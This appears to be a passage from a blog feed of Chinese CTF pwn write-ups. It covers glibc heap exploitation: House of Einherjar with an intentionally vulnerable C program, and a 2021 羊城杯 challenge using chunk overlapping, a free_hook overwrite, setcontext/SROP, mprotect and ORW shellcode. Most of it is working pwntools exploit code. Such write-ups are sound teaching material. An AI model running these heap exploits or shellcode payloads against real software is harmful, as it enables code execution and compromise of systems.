class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x291</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 0x290 = 0x60+0x70*5</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">"=["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]="</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x320</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"11"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'12'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'13'</span><span class="token punctuation">)</span> <span class="token comment"># tcache don't check chunk_size</span><span class="token triple-quoted-string string">'''CHUNK[13]0x0000000000000000  0x00000000000000710x0000000000000000  0x0000000000000291 &lt;- CHUNK_PTR[6]0x0000000000003331  0x0000000000000000 &lt;- CHUNK_PTR[13]0x0000000000000000  0x0000000000000000'''</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x280</span><span class="token punctuation">,</span><span class="token string">"14"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x291</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># tcachebins</span><span class="token comment"># 0x290 [  2]: chunk[13] —> _IO_2_1_stdin_ </span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x280</span><span class="token punctuation">,</span><span class="token string">"13"</span><span class="token punctuation">)</span><span class="token comment"># =============[fake IO file]===============</span><span class="token comment"># size = 0xe0</span>fake_io <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token comment">#flag</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_read_ptr</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_read_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_read_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdin<span class="token operator">+</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_ptr (setcontext的参数rdx,使其指向 srop_mprotect)</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_buf_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_buf_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_save_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_backup_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_save_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_markers </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_chain </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_fileno </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_flags2</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_old_offset</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_cur_column </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_vtable_offset</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_shortbuf</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_lock</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_offset</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_codecvt</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_wide_data</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_freeres_list</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_freeres_buf</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#__pad5</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vtable<span class="token punctuation">)</span> <span class="token comment">#vtable -> _IO_str_jumps</span>srop_mprotect <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>srop_mprotect<span class="token punctuation">.</span>rsp <span class="token operator">=</span> malloc_hook <span class="token operator">+</span> <span class="token number">0x8</span>srop_mprotect<span class="token punctuation">.</span>rdi <span class="token operator">=</span> malloc_hook_basesrop_mprotect<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>srop_mprotect<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>srop_mprotect<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token comment"># read shellcode</span>mpro <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdi,rdimov rsi,%dmov rdx,0x1000xor rax,raxsyscalljmp rsi'''</span><span class="token operator">%</span>malloc_hook_basepayload <span class="token operator">=</span> fake_io <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>srop_mprotect<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setcontext <span class="token operator">+</span> <span class="token number">61</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>mpro<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x288</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># ===========[get shell]============</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"you?\n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#执行exit(0),Begin ORW</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>malloc_hook_base<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>malloc_hook_base<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-House_of_Einherjar</title>
      <link href="//post/pwn-House-of-Einherjar.html"/>
      <url>//post/pwn-House-of-Einherjar.html</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><blockquote><p>说来惭愧,一直没有好好学下这个House技术</p><p>刚入门heap的时候倒是看过但感觉实在是过于囫囵吞枣,有必要重新整理一下</p><p>适用于 Ubuntu16  libc-2.23</p></blockquote><span id="more"></span><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p><p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>CTFwiki上讲了很多但是讲得很….绕,这里简单用个例子介绍下:</p><p>漏洞程序:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token operator">*</span> s0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　<span class="token comment">//构造fake chunk</span>    <span class="token keyword">char</span><span class="token operator">*</span> s1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> s2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　    <span class="token keyword">char</span><span class="token operator">*</span> s3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//为了不让s2与top chunk 合并</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"begin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> s0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input s0\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s0<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读入fake chunk</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input s1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s1<span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Off By One</span>    <span class="token function">free</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"begin\n"</span><span class="token punctuation">)</span>address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input s0\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x221</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0xe0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment">#fake size</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input s1\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x220</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\x00"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说就是先伪造一个fake chunk,该chunk在可以offbyone的chunk的上面</p><pre class="line-numbers language-none"><code class="language-none">| |0xsize | &lt;- fake_chunk|fd |bk   ||   ||   padding   ||   |--------------------|fake_prv|   0xsize| &lt;- offbyone[chunk1]|   |   |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中伪造的fd和bk满足 p-&gt;fd = p p-&gt;bk = p</p><p>fake_prv等于一直到上面那个fake_chunk的地址.</p><p>之后释放chunk1就可以向上合并.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里我们总结下这个利用技术需要注意的地方</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><p>其实，该技术与 chunk extend/shrink 技术比较类似。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;WP&gt;羊城杯2021</title>
      <link href="//post/WP-%E7%BE%8A%E5%9F%8E%E6%9D%AF2021.html"/>
      <url>//post/WP-%E7%BE%8A%E5%9F%8E%E6%9D%AF2021.html</url>
      
        <content type="html"><![CDATA[<h1 id="WP-羊城杯2021"><a href="#WP-羊城杯2021" class="headerlink" title="[WP]羊城杯2021"></a>[WP]羊城杯2021</h1><p>果然全程被ayoung大佬带飞QvQ</p><span id="more"></span><h2 id="whatsyourname"><a href="#whatsyourname" class="headerlink" title="whatsyourname"></a>whatsyourname</h2><p>chunk overlapping , setcontext , mprotect</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>每一个name由两个chunk构成,其中一个固定为0x20的chunk存放含有name信息chunk的地址,同时程序运行会存在大量脏数据,方便泄露libc地址</p><p>首先利用chunk overlapping实现任意地址写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token comment"># 7</span>add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment"># 9</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># unlink 6-8 (include 7)</span>add<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token comment">#6</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment">#8</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">-</span><span class="token number">18244200</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后再编辑chunk8即可修改free hook的内容</p><p>具体的lapping过程:</p><p>申请</p><p>add(0xa8) # 6<br>add(0x58) # 7<br>add(0xf8) # 8<br>add(0x100)# 9 -&gt; 隔开topchunk和之后放farme</p><p>释放chunk6,并在chunk7的末尾(chunk 8 的prev size位)写上0x110(0xb0+0x60)</p><p>释放chunk8 即可unlink 6 和8 ,但是其中包含了可控的chunk7</p><p>利用chunk7 的编辑修改某个chunk指针指向free hook</p><p>修改free hook为:p64(libc_base + libc.symbols[‘setcontext’] + 53) + p64(libc_base+libc.sym[‘__free_hook’]+0x18)*2 + asm(shell1)</p><p>其中shell1:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">newexe <span class="token operator">=</span> <span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shell1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdi,rdimov rsi,%dmov edx,0x1000frmov eax,0syscalljmp rsi'''</span> <span class="token operator">%</span> newexe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时中chunk9中填入farme</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> newexeframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后只要释放chunk9即可触发SROP,执行sysread并执行</p><p>发送 orw的shellcode即可得到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">1</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./name"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./name'</span><span class="token punctuation">)</span><span class="token comment"># else:</span><span class="token comment">#     p = remote(str(ip),port)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name size:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># clean 0x80 bins    </span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token comment"># leak heap</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x0a\x31'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token 